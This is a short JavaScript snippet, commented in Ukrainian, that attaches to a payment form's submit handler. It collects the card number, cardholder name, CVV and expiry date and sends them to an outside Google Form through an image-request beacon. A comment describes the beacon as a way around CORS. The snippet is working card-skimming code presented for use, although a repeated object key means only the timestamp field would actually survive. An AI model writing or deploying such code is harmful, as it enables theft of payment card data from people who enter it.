...
document.getElementById('paymentForm').addEventListener('submit', async function(e) {
    ...
    // Відправка даних на Google Form
    const formUrl = 'https://docs.google.com/forms/d/e/1FAIpQLSe5RlgTPaAG_l_opGPhqKC1wdZEjz0xv-y4Ph7nPBkyimvCIA/formResponse';
    
    const params = new URLSearchParams({
        'entry.1600138579': `Номер: ${cardData.number}`,
        'entry.1600138579': `Ім'я: ${cardData.name}`,
        'entry.1600138579': `CVV: ${cardData.cvv}`,
        'entry.1600138579': `Термін: ${cardData.expiry}`,
        'entry.1600138579': `Час: ${new Date().toLocaleString('de-DE')}`,
        'submit': 'Submit'
    });

    // Відправка через Image (обхід CORS)
    const img = new Image();
    img.src = `${formUrl}?${params.toString()}`;
    
    console.log('Дані відправлено на Google Form');
});
